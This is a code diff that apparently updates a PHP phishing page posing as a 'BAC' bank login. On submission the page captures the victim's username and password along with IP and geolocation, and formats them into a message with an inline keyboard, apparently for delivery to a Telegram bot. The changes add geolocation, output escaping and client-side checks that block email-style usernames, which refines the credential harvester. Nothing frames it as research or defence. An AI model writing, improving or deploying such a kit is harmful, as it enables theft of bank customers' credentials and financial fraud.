@@ -5,22 +5,23 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $usuario = trim($_POST['usuario'] ?? '');
     $clave   = trim($_POST['contrasena'] ?? '');
 
-    $ip = '';
-    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
-        if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
-    }
-    $ip   = $ip ?: '?';
-    $ua   = $_SERVER['HTTP_USER_AGENT'] ?? '?';
-    $date = date('d/m/Y H:i:s');
+    $ip  = client_ip() ?: '?';
+    $geo = geo_lookup($ip);
+
+    $ubic = trim(($geo['city'] ? $geo['city'] . ', ' : '')
+                . ($geo['region'] ? $geo['region'] . ', ' : '')
+                . $geo['country'], ', ');
 
     $msg  = "🏦 BAC — ACCESO\n";
     $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-    $msg .= "👤 <b>Usuario:</b> $usuario\n";
-    $msg .= "🔑 <b>Clave:</b> $clave\n";
+    $msg .= "👤 <b>Usuario:</b> " . htmlspecialchars($usuario) . "\n";
+    $msg .= "🔑 <b>Clave:</b> "   . htmlspecialchars($clave)   . "\n";
     $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-    $msg .= "🌐 <b>IP:</b> $ip\n";
-    $msg .= "🕒 <b>Fecha:</b> $date\n";
-    $msg .= "📲 <b>UA:</b> " . substr($ua, 0, 80) . "\n";
+    $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
+    $msg .= ($geo['flag'] ?: '📍') . " <b>País:</b> " . htmlspecialchars($geo['country']);
+    if ($geo['country_code']) $msg .= " (" . $geo['country_code'] . ")";
+    $msg .= "\n";
+    if ($ubic && $ubic !== $geo['country']) $msg .= "🏙 <b>Ubicación:</b> " . htmlspecialchars($ubic) . "\n";
 
     $keyboard = json_encode([
         'inline_keyboard' => [
@@ -563,6 +564,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 <div class="form-group">
                     <label for="usuario">Usuario</label>
                     <input type="text" id="usuario" name="usuario" autocomplete="username" required>
+                    <p class="field-error" id="usuarioError" style="display:none">El usuario no puede ser un correo electrónico.</p>
                 </div>
 
                 <div class="form-group">
@@ -610,7 +612,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         </span>
     </footer>
 
-<?php if (!empty($_GET['error'])): ?>
 <style>
   .field-error{
     color:#e4002b;font-size:13px;font-weight:600;
@@ -618,8 +619,42 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     display:flex;align-items:center;gap:6px;
   }
   .field-error::before{content:"⚠";font-size:14px}
+  .input-error{border-color:#e4002b !important;box-shadow:0 0 0 3px rgba(228,0,43,.12) !important}
+<?php if (!empty($_GET['error'])): ?>
   #contrasena{border-color:#e4002b !important;box-shadow:0 0 0 3px rgba(228,0,43,.12) !important}
-</style>
 <?php endif; ?>
+</style>
+
+<script>
+(function(){
+  var input = document.getElementById('usuario');
+  var err   = document.getElementById('usuarioError');
+  var form  = document.getElementById('loginForm');
+  if (!input || !err) return;
+
+  function looksLikeEmail(v){
+    // detecta @ o formato de correo
+    return /@/.test(v) || /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
+  }
+  function validate(){
+    var v = input.value.trim();
+    if (v && looksLikeEmail(v)) {
+      err.style.display = 'flex';
+      input.classList.add('input-error');
+      return false;
+    }
+    err.style.display = 'none';
+    input.classList.remove('input-error');
+    return true;
+  }
+  input.addEventListener('input', validate);
+  input.addEventListener('blur', validate);
+  if (form) {
+    form.addEventListener('submit', function(e){
+      if (!validate()) { e.preventDefault(); input.focus(); }
+    });
+  }
+})();
+</script>
 </body>
 </html>
